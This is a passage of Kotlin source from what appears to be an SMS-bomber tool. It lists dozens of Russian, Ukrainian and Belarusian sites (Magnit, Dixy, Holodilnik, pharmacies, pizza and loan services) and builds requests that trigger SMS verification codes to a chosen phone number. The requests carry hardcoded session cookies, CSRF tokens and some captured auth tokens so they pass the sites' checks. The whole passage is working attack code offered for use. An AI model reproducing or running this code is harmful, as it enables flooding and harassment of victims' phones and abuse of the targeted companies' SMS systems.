                    "PHPSESSID=75ffo2jbrgiilp6ru01ehorsg3; BITRIX_SM_WATCHER_REFERER_ID=11; _fbp=fb.1.1674666273780.2098848882; BITRIX_SM_BUYER_ID=34615018; BITRIX_SM_BUYER_KEY=78ba6e6eb4bb251a38225386e8883b19; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4"
                )

            builder
                .addQueryParameter("phone", format(phone.phone, "+375 (**) ***-**-**"))
                .addQueryParameter("code", "")
                .addQueryParameter("UF_REG_AGREE_PERS", "Y")
        }
    },

    object : FormService("https://vladimir.holodilnik.ru/ajax/user/get_tpl.php?96.22364161776159", 7) {
        override fun buildBody(phone: Phone) {
            request
                .header(
                    "Cookie",
                    "region_position_nn=24; clean=1; new_home=2; oneclick_order=1; new_reg=2; HRUSID=8f3a403f8f1002b7df0cdc1234b5b834; HRUSIDLONG=8a51a897e72d705cfb0f2d4c1a1ebf6a; csrfnews=8ac641e766c183e782f0706756539ab3; mindboxdbg=0; tmr_lvid=668db02d45d79ad233216bc3a7aef88b; tmr_lvidTS=1673961864893; _ga=GA1.2.1588267531.1673961865; _ym_uid=1673961868198063374; _ym_d=1673961868; _userGUID=0:ld09oc00:Kr2KhQWKzm~voxxbrrmT4bSCUcN8nho_; advcake_track_id=5dd8b4db-6078-ae09-d2bf-7659a208454f; advcake_session_id=ccac051d-b53e-53bb-7567-61fae11a8ee8; flocktory-uuid=e429bd85-39fc-4d6b-9b57-d6abe16258af-3; wtb_sid=null; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue Jan 17 2023\",\"idContainer\":\"1000247C\"}; adrcid=A0WchnQwBnxZ1EMPWxqzT3A; aprt_last_partner=actionpay; aprt_last_apclick=; aprt_last_apsource=1; _ga_EHP29G0JCQ=GS1.1.1673978244.2.0.1673978244.0.0.0; OrderUserType=1; HRUSIDSHORT=01933d4afb396c7405ee9f30809b3582; _utmx=8f3a403f8f1002b7df0cdc1234b5b834; _gid=GA1.2.1622488607.1674747661; dSesn=a33b4119-8977-a5c5-1cc4-72a8c3cdbddf; _dvs=0:ldd9im3g:~~w7twQuttk6ru660celwXTh1ZSeWppu; _ym_isad=2; _ubtcuid=cldd9im7p00003nbnukki9pu6; action_blocks=; banners_rotations=1067; _utmz=2cebd56ce5cbf15d6e6fdaa7d46aa40551ade24425f8530e480df12b1823376e; _sp_ses.4b6a=*; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; tmr_detect=0|1674747664191; PHPSESSID=503437c08856d897c7942267cb62eab0; _gat=1; _sp_id.4b6a=3ce0c76f-2b49-434d-9fdf-7a5ce8f9fb30.1673961869.2.1674747882.1673961984.a30f1324-8eca-4544-9a3c-3572d897dccf"
                )
                .header("X-Requested-With", "XMLHttpRequest")

            builder
                .add("ajkey", "cf0ed62da76642fc510e517210addd06")
                .add("ajform", "LOGIN_FORM")
                .add("ajaction", "GET_CODE")
                .add("ajphoneORemail", "+$phone")
                .add("ajverifycode", "")
                .add("ajUserType", "1")
                .add("ajConfPhone", "")
                .add("ajConfEmail", "")
                .add("ajPswd", "")
                .add("ajSubMode", "")
        }
    },

    object : Service(380) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://online-apteka.com.ua/assets/components/ajaxfrontend/action.php")
                    .headers(
                        Headers.Builder()
                            .add("x-requested-with", "XMLHttpRequest")
                            .addUnsafeNonAscii(
                                "Cookie",
                                "PHPSESSID=ovtn4q0g3f4g1c3mdnkuu94gon; msfavorites=ovtn4q0g3f4g1c3mdnkuu94gon; lastContext=web; _gid=GA1.3.2033245176.1674752800; _gat_gtag_UA_88170340_1=1; _ga_3SRTFP3H03=GS1.1.1674752799.1.1.1674752804.0.0.0; _ga=GA1.3.1765539140.1674752800; biatv-cookie={\"firstVisitAt\":1674752799,\"visitsCount\":1,\"campaignCount\":1,\"currentVisitStartedAt\":1674752799,\"currentVisitLandingPage\":\"https://online-apteka.com.ua/\",\"currentVisitOpenPages\":2,\"location\":\"https://online-apteka.com.ua/auth.html\",\"locationTitle\":\"Вход\\\\Регистрация - Мед-Сервис\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61\",\"language\":\"ru\",\"encoding\":\"utf-8\",\"screenResolution\":\"1536x864\",\"currentVisitUpdatedAt\":1674752802,\"utmDataCurrent\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"campaignTime\":1674752799,\"utmDataFirst\":{\"utm_source\":\"(direct)\",\"utm_medium\":\"(none)\",\"utm_campaign\":\"(direct)\",\"utm_content\":\"(not set)\",\"utm_term\":\"(not set)\",\"beginning_at\":1674752799},\"geoipData\":{\"country\":\"Poland\",\"region\":\"Mazovia\",\"city\":\"Warsaw\",\"org\":\"\"}}; bingc-activity-data={\"numberOfImpressions\":0,\"activeFormSinceLastDisplayed\":0,\"pageviews\":1,\"callWasMade\":0,\"updatedAt\":1674752810}"
                            )
                            .build()
                    )
                    .post(
                        """
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="login"
    
    ${format(phone.phone, "+38 (0**) ***-**-**")}
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="action"
    
    generatePassword
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="hash"
    
    1b0e6c59bf26361ac6b9d382fb515f2b
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="hash_dynamic"
    
    5111af00ece822750e74d295aa17f79f
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="context"
    
    web
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="page_id"
    
    58886
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e
    Content-Disposition: form-data; name="page_url"
    
    /auth.html
    ------WebKitFormBoundaryKJ1G3JA5mtkOMt2e--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundaryKJ1G3JA5mtkOMt2e".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : JsonService("https://anc.ua/authorization/auth/v2/register", 380) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "auth.strategy=local; auth._token.local=false; auth._refresh_token.local=false; city=5; _gid=GA1.2.2014301269.1674753416; _fbp=fb.1.1674753418996.1198222138; _ga_36VHWFTBMP=GS1.1.1674753419.1.0.1674753419.60.0.0; sc=35564E72-62BB-B2D6-FDA0-BFBA8391ED2D; _ga=GA1.2.117128623.1674753416; _dc_gtm_UA-169190421-1=1"
            )

            return JSONObject()
                .put("login", "+$phone")
                .toString()
        }
    },

    object : FormService("https://rnr.com.ua/sms/send", 380) {
        override fun buildBody(phone: Phone) {
            builder.add("phone_number", format(phone.phone, "+38 (0**) *** ** **"))
            request
                .header("x-csrf-token", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                .header("x-csrftoken", "PeCkfQTNSESvpofMgX2bRlSqk7Ab5rkSZ38dHY1a")
                .header("x-requested-with", "XMLHttpRequest")
        }
    },

    object : MultipartService(
        "https://woodman.by/resource/themes/woodman/action/login/verify.php?register=true",
        375
    ) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=95a6b858b762b5b1553ddcf65bfaee04; _gcl_au=1.1.734651332.1675604508; _gid=GA1.2.1783988263.1675604508; _gat_gtag_UA_180993361_1=1; _dc_gtm_UA-180993361-1=1; _ym_uid=1675604508910510402; _ym_d=1675604508; _fbp=fb.1.1675604507962.2028429428; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.399891246.1675604508; _ga_HZKXP3YNMT=GS1.1.1675604507.1.1.1675604511.0.0.0; welcome-cookie=true"
            )

            builder.addFormDataPart("phone", format(phone.phone, "+375 (**) ***-**-**"))
            builder.addFormDataPart("country", "by")
            builder.addFormDataPart("password", "")
            builder.addFormDataPart("code", "")
        }
    },

    object : JsonService("https://api.sunlight.net/v3/customers/authorization/", 7) {
        override fun buildJson(phone: Phone): String {
            request.headers(
                Headers.Builder()
                    .add("X-Requested-With", "SunlightFrontendApp")
                    .addUnsafeNonAscii(
                        "Cookie",
                        "city_auto_popup_shown=1; region_id=a2abfdde-54eb-43c0-981c-644657238a3c; region_subdomain=\"\"; ccart=off; session_id=1b7ddd46-ee43-443f-9faa-b0274689f4ab; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; _ga=GA1.2.1099609403.1670778978; _gid=GA1.2.1444923732.1670778978; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; _tt_enable_cookie=1; _ttp=a3a48ff1-8e5d-407d-8995-dc4e7ca99913; _ym_uid=1659884110990105023; _ym_d=1670778978; _ym_isad=2; _ym_visorc=b; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ga_HJNSJ6NG5J=GS1.1.1670778977.1.0.1670778980.57.0.0; auid=1196ce38-5136-4290-bf14-e29d02d50fa7:1p4Pw3:gOobko9I_s6h9Ng8IWQXyNN-TejCW4-SO1-lN7_LLjQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}"
                    )
                    .build()
            )

            return JSONObject()
                .put("phone", phone)
                .toString()
        }
    },

    object : FormService("https://dostavka.dixy.ru/ajax/mp-auth-test.php", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=5ab480a3917eae435390edb75770783a; price_id=80; BITRIX_SID=6C68VRK27r; BITRIX_SM_SALE_UID=755ab7df02053be0e14760d64d16f5b9; _ym_debug=null; countmobile=2; usecookie=accept; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _gid=GA1.2.1143019386.1676373558; _dc_gtm_UA-172001173-1=1; _ga=GA1.3.1377249881.1676373558; _gid=GA1.3.1143019386.1676373558; _gat_UA-172001173-1=1; _ym_uid=167637355813882176; _ym_d=1676373558; _ga_J3JT2KMN08=GS1.1.1676373558.1.0.1676373558.60.0.0; _ga=GA1.1.1377249881.1676373558; tmr_lvid=ea5f0ffa7ac4e6584f870de9a81d1313; tmr_lvidTS=1676373558371; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1676373561282"
            )
            request.header("x-requested-with", "XMLHttpRequest")

            builder.add("phone", phone.toString())
            builder.add("licenses_popup", "Y")
            builder.add("licenses_popup1", "Y")
            builder.add("licenses_popup2", "Y")
        }
    },

    object : FormService("https://tb.tips4you.ru/auth/ajax/signup_action", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=boe2n8jajco2f38tol7o6htedr; _csrf=56a6833d81db55efdbbd72be737db8d3; _ym_uid=167637442891771139; _ym_d=1676374428; _ym_isad=2; _ym_visorc=w"
            )
            request.header("X-Requested-With", "XMLHttpRequest")

            builder.add("phone", format(phone.phone, "(***) ***-**-**"))
            builder.add("step", "1")
        }
    },

    object : FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
        override fun buildBody(phone: Phone) {
            builder.add("phone", format(phone.phone, "+7 ( *** ) ***-**-**"))
            builder.add("ksid", "225294bc-012e-4054-97c3-c4dbefb8f0af_0")
            request.header("Sec-Fetch-Dest", "empty")
            request.header("Sec-Fetch-Mode", "cors")
            request.header(
                "sec-ch-ua",
                "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\""
            )
            request.header("sec-ch-ua-mobile", "?0")
            request.header("sec-ch-ua-platform", "\"Windows\"")
            request.header("Sec-Fetch-Site", "same-site")
            request.header(
                "Cookie",
                "PHPSESSID=6e2s2jco3rvpi33tluqecad3kt; _gid=GA1.2.1116348124.1676383880; _gat_UA-61230203-9=1; _gat_UA-61230203-3=1; _ym_uid=1661249544448490865; _ym_d=1676383880; _clck=1j2pzux|1|f94|0; _ym_visorc=w; _ym_isad=2; _ga=GA1.4.490589619.1676383880; _gid=GA1.4.1116348124.1676383880; _gat_UA-61230203-5=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; KFP_DID=fe822d3f-4a57-723d-2706-a9521f9bd17d; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1676408340,\"UNIQUE\":[\"conversion_visit_day\"]}; _clsk=vn6qns|1676383884870|2|1|i.clarity.ms/collect; _ga=GA1.2.490589619.1676383880; _ga_GW0P06R9HZ=GS1.1.1676383884.1.0.1676383893.0.0.0; oxxfgh=225294bc-012e-4054-97c3-c4dbefb8f0af#1#7884000000#5000#1800000#12840"
            )
        }
    },

    object : JsonService("https://api.starterapp.ru/clubve/auth/resetCode", 7) {
        override fun buildJson(phone: Phone): String {
            request.header("sessionid", "4041bd83-f1fe-4711-8efa-6ac31e81b3de")
            return JSONObject()
                .put("phone", phone)
                .toString()
        }
    },

    CurlService(
        """
                        curl 'https://lgcity.ru/ajax/Auth/SmsSend/' \
                          -H 'authority: lgcity.ru' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: __js_p_=191,1800,0,0,0; __jhash_=1064; __jua_=Mozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36; __lhash_=83b96a60b0757cc6d8453d6bce719087; PHPSESSID=258f4d20c809bc213e42c1db5a33017b; BITRIX_SM_SALE_UID=476d76677dc5c56c4f5c463c3b9aa874; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1682974740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gcl_au=1.1.237613471.1682939195; flocktory-uuid=52c1b31a-3ef1-4f6d-aef4-84de50a73b8b-9; gcui=; gcmi=; gcvi=OCLukNCKntX; gcsi=gA7L2NyZqjE; _ga_VNL8C6TDCT=GS1.1.1682939195.1.0.1682939195.60.0.0; _userGUID=0:lh4qjm5l:dCSFCluk6CwEo5eNzPRJ5EBYzYcsWt5K; dSesn=16840b2b-20cb-3533-9d4d-b711c6627a62; _dvs=0:lh4qjm5l:f32nIdkdj2xO8r17p5AGKUmRSfTwImgJ; rrpvid=952084627110672; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.545756460.1682939196; _gid=GA1.2.1607227217.1682939196; _gat_UA-97400312-1=1; _gat_UA-97400312-2=1; _ym_uid=1674663975775501735; _ym_d=1682939196; advcake_trackid=21990e82-9127-f8e2-1693-db5b914202f6; advcake_session_id=4ff73dcc-01dd-74fe-c731-e1d49818c5a1; rcuid=6275fcd65368be000135cd22; _spx=eyJpZCI6IjJkNTQ4MzkwLTc2MzktNDQxOS1hM2IyLWM2ZTkxZmZmYzRiYSIsInNvdXJjZSI6IiIsImRlcHRoIjp7InZhbHVlIjp7ImRlcHRoIjoxLCJoaXN0b3J5IjpbMF19fSwidGltZSI6eyJ0aW1lIjoxNjgyOTM5MTk2NDg2fSwiZml4ZWQiOnsic3RhY2siOlswXX19; tmr_lvid=2fcc8a7885309fab71d1edf23778c5b6; tmr_lvidTS=1674663974919; _ym_isad=2; X-User-DeviceId=8038803a-73b7-47c5-b7a4-ea918ccd2589; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=4a291964-49f2-48d8-b032-a6c1ac8bba17; adrdel=1; adrcid=AZZZYvYyjgxQ4tvouNKmhhg; analytic_id=1682939197940287; tmr_detect=0%7C1682939199063; __hash_=302c1be4fc7dc9b97c7672bb0db6e53a' \
                          -H 'origin: https://lgcity.ru' \
                          -H 'referer: https://lgcity.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-request-csrf-token: a7141c3c045a34f8f3e6c445ce228b6d' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'sentCode=&phone={formatted_phone:%2B*+(***)+***-****}&code=&smsSubscription=Y' \
                          --compressed
                          """.trimIndent()
    ),

    object : FormService("https://planetazdorovo.ru/ajax/vigroup-p_a.php", 7) {
        override fun buildBody(phone: Phone) {
            request.headers(
                Headers.Builder()
                    .add("Referer", "https://planetazdorovo.ru/lk/signin/")
                    .add("Host", "planetazdorovo.ru")
                    .add("Sec-Fetch-Dest", "empty")
                    .add("Sec-Fetch-Mode", "cors")
                    .add(
                        "sec-ch-ua",
                        "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\""
                    )
                    .add("sec-ch-ua-mobile", "?0")
                    .add("sec-ch-ua-platform", "\"Windows\"")
                    .add("Sec-Fetch-Site", "same-site")
                    .addUnsafeNonAscii(
                        "Cookie",
                        "qrator_jsr=1677582740.566.In07njqCVZw5koqB-k1b092ul36om26ol7ajbmmvqgdhvbvj4-00; qrator_ssid=1677582740.999.bsbTQ9GJ8X3V7fdw-ke00ru45nn5p8jb1ovg1vk3sqh7lr9a4; qrator_jsid=1677582740.566.In07njqCVZw5koqB-jlkvgbqlci6fmb5mohn5c5ntrl85nemp; city_id=749807; city_xml=363; city=Москва и МО; city_code=moskva-i-mo; help_phone=(495) 369-33-00; order_phone=8 (495) 145-99-33; region=12; timezone=10800; show_bonus=1; region_id=16; PHPSESSID=OMzzD9XPBUsMvzhXaKHQLEoIWe7caD4H; BITRIX_CONVERSION_CONTEXT_s1={\"ID\":1,\"EXPIRE\":1677610740,\"UNIQUE\":[\"conversion_visit_day\"]}; _gcl_au=1.1.347187122.1677582744; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.360028804.1677582744; _gid=GA1.2.463013004.1677582744; tmr_lvid=f20e6d758cfa83ebe50bff36e0e4adaa; tmr_lvidTS=1661187312248; _dc_gtm_UA-126829878-1=1; _ym_uid=1661187313781808485; _ym_d=1677582745; _ym_isad=2; _ym_visorc=b; tmr_detect=0|1677582748986; carrotquest_session=npr74mk7dbi2tp94abgqye0sdfq01vmj; carrotquest_session_started=1; carrotquest_device_guid=350a2f93-ae05-4187-867c-16281e97040c; carrotquest_uid=1388102814265248160; carrotquest_auth_token=user.1388102814265248160.23139-c082d1441dfd0f22105416f38a.2dc58f4da60c0268408468b874082f4711e468538b1f82a9; carrotquest_realtime_services_transport=wss"
                    )
                    .addUnsafeNonAscii("X-Requested-With", "XMLHttpRequest")
                    .build()
            )

            builder.add("sessid", "f74d886e3df6be27574c309a0e9207da")
            builder.add("phone", format(phone.phone, "+7 (***) ***-****"))
            builder.add("Login", "")
        }
    },

    object :
        JsonService("https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/nn/auth/request_code/", 7) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
            )
            request.header(
                "Cookie",
                "cityId=23; sessionid=yxwpnnmtmfy2peeytvjo9kj3kiq2lv9n; rerf=AAAAAGP99PKfCoeNA8e0Ag==; _ga=GA1.2.277914625.1677587700; _gid=GA1.2.1785919836.1677587700; tmr_lvid=40677f5848edffde0fc28433bafe137f; tmr_lvidTS=1677587699936; _tt_enable_cookie=1; _ttp=R-8KDrOnkQJb2ZeLtJ0LsJ923uW; _ym_uid=1677587701806969337; _ym_d=1677587701; _ym_isad=2; _ym_visorc=b"
            )
            return JSONObject()
                .put("phone", phone.toString())
                .put("ui_element", "login")
                .toString()

        }
    },

    object : JsonService("https://vodnik.ru/signin/sms-request", 7) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "s25a=u4ndvlp0r26durgi2uoj0ksmuc; s25shopuid=u4ndvlp0r26durgi2uoj0ksmuc; _gcl_au=1.1.1586843065.1677588634; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_first_add=fd=2023-02-28 15:50:34|||ep=https://vodnik.ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57; sbjs_session=pgs=1|||cpg=https://vodnik.ru/; _ga=GA1.2.2011946081.1677588634; _gid=GA1.2.324262795.1677588634; _dc_gtm_UA-34944982-1=1; _gat_UA-34944982-1=1; tmr_lvid=7bec5deb51717470cbe877180f97522b; tmr_lvidTS=1677588634426; _ym_uid=1677588635482671495; _ym_d=1677588635; adrdel=1; adrcid=Aj7OPttQx7VBI30FVh8R7-w; _ym_isad=2; _ym_visorc=w; tmr_detect=0|1677588637044"
            )
            return JSONObject()
                .put("phone", format(phone.phone, "+7 ***-***-**-**"))
                .toString()
        }
    },

    object : FormService("https://lk.zaim-express.ru/Account/RegisterCode", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                ".AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8PIBqEVSjzpBkUhnd5gD6hRFuPIyWIRHvk7WETivIQ6sWgvFWBlhlxBZLkF9m3RzPUTfCsMjzrtG7aCPV5UNKgZLxrNX1fjoASszqEbsTFrsrtGrrUG1a39yMwd3nukdHGcT7lWPS0oT03Tlxy3OHgs; .LoanExpress.Session=CfDJ8PIBqEVSjzpBkUhnd5gD6hRUjVIXcF7Qjk/vsPeRrReI8/HQCyyoseAycjzquMGXWrEm+3B40xCyUZf+FTEPgEK3CABKs5Sq62hakDyY0nvB7coA9s89XvA5l4NsLfQ2bkXnvNRRqLfNS5r//ULnFlsBkb5J3Mto6d0cYaSNZTE1; _ym_uid=1677588936312422059; _ym_d=1677588936; _ym_isad=2; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _gid=GA1.2.484481173.1677588936; _ym_visorc=b; _ga_2JB47PMSVE=GS1.1.1677588936.1.1.1677589010.0.0.0; _ga=GA1.2.1772293061.1677588936; _gat_gtag_UA_76114749_2=1"
            )
            builder.add("CellNumber", format(phone.phone, "+7 (***) ***-**-**"))
        }
    },

    object : JsonService("https://ipizza.ru/gql", 7) {
        override fun buildJson(phone: Phone): String {
            return "{\"query\":\"mutation sendPhone(\$domain:ID!,\$phone:String!,\$recaptcha:String){phone(number:\$phone,region:\$domain,recaptcha:\$recaptcha){token error{code message}}}\",\"variables\":{\"domain\":\"msk\",\"phone\":\"$phone\"}}"
        }
    },

    object : JsonService("https://clientsapi01w.bk6bba-resources.com/cps/superRegistration/createProcess", 7) {
        override fun buildJson(phone: Phone): String {
            return "{\"fio\":\"\",\"password\":\"gewgerwgergewrger3t\",\"email\":\"\",\"emailAdvertAccepted\":true,\"phoneNumber\":\"+$phone\",\"webReferrer\":\"\",\"advertInfo\":\"ga_client_id=GA1.1.1519138250.1677588511\",\"platformInfo\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57\",\"promoId\":\"\",\"ecupis\":true,\"birthday\":\"1982-02-01\",\"sysId\":1,\"lang\":\"ru\",\"appVersion\":\"4.21.1\",\"deviceId\":\"F00A7159477F67B7B4FA0EE3B0C02A2F\"}"
        }
    },

    object : FormService("https://semena-partner.ru/ajax/getPhoneCodeReg.php", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "PHPSESSID=8Kg3rH9a1vAjAJOAq7zi3nXb90jwzcGQ; BITRIX_SM_lonCookie=1677589657; BITRIX_SM_lonCookieCondition=c0; _ym_uid=1677589660863243211; _ym_d=1677589660; _ga=GA1.2.322385156.1677589660; _gid=GA1.2.198810140.1677589660; _gat=1; rrpvid=607519930160743; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22"
            )
            request.header(
                "User-Agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.57"
            )
            request.header("Sec-Fetch-Dest", "empty")
            request.header("Sec-Fetch-Mode", "cors")
            request.header(
                "sec-ch-ua",
                "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\""
            )
            request.header("sec-ch-ua-mobile", "?0")
            request.header("sec-ch-ua-platform", "\"Windows\"")
            request.header("Sec-Fetch-Site", "same-site")
            request.header("x-requested-with", "XMLHttpRequest")
            builder.add("phone", format(phone.phone, "+7(***) ***-**-**"))
        }
    },

    object : FormService("https://agro-market24.ru/ajax/auth.php", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "newrelic",
                "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MzE0NDciLCJhcCI6IjI4OTc1NjMyNiIsImlkIjoiYjk0YWNjYjM3NmJkYTQyOSIsInRyIjoiNmYwMmQ4YTY3MTU0YzY2MDZhMTMzMTM3YzgxMmRiODAiLCJ0aSI6MTY3NzU4OTkwNTAyMH19"
            )
            request.header("traceparent", "00-6f02d8a67154c6606a133137c812db80-b94accb376bda429-01")
            request.header("x-newrelic-id", "VgAEUFJXDxACV1NQAwADXlE=")
            request.header("tracestate", "2631447@nr=0-1-2631447-289756326-b94accb376bda429----1677589905020")
            builder.add("mode", "reg")
            builder.add("phone", format(phone.phone, "+7(***)*******"))
            builder.add("name", userName)
            builder.add("email", email)
            builder.add("code", "0")
        }
    },

    object : JsonService("https://api.starterapp.ru/bdbar/auth/resetCode", 7) {
        override fun buildJson(phone: Phone): String {
            request.header("sessionid", "74b74767-244a-42ef-acd7-bc38916e79f4")
            request.header("authcode", "")
            request.header("lang", "ru")

            return JSONObject()
                .put("phone", phone.toString())
                .toString()
        }
    },

    object : FormService("https://tashirpizza.ru/ajax/mindbox_send_sms", 7) {
        override fun buildBody(phone: Phone) {
            builder.add("phone", format(phone.phone, "+7 (***) ***-**-**"))
            builder.add("smsType", "simple")
        }
    },

    object : FormService("https://tehnoskarb.ua/register", 380) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "_gcl_au=1.1.380904791.1677590803; _ga=GA1.1.701174307.1677590803; _fbp=fb.1.1677590804301.1176961182; dashly_device_guid=2d44a8af-e1f3-4593-8022-a11e7adbbb00; dashly_uid=1388170375157778425; dashly_auth_token=user.1388170375157778425.4561-b2b6523d280093ec133617ae010.afed4a86ba8fb4479c4c3691c66b893b1894e3b00906f209; dashly_session=kdsomp5khudhjyvq65o67afezvy8vmaz; dashly_session_started=1; dashly_realtime_services_transport=wss; _ga_1P2E8RZQPX=GS1.1.1677859782.3.1.1677859804.38.0.0"
            )
            builder.add("name", userName)
            builder.add("email", email)
            builder.add("phone", format(phone.phone, "+380(**)***-**-**"))
            builder.add("password", "fwe31434123Q")
            builder.add("confirmPassword", "fwe31434123Q")
            builder.add("subaction", "saveUser")
        }
    },

    object : FormService("https://hvalwaters.ru/register/send-sms-code/", 7) {
        override fun buildBody(phone: Phone) {
            request.header("X-CSRF-TOKEN", "3K03ra96n2jDeCKVSuCtdbY26MEFSBAcAIrrPYM4")
            request.header("X-Requested-With", "X-Requested-With")
            request.header(
                "Cookie",
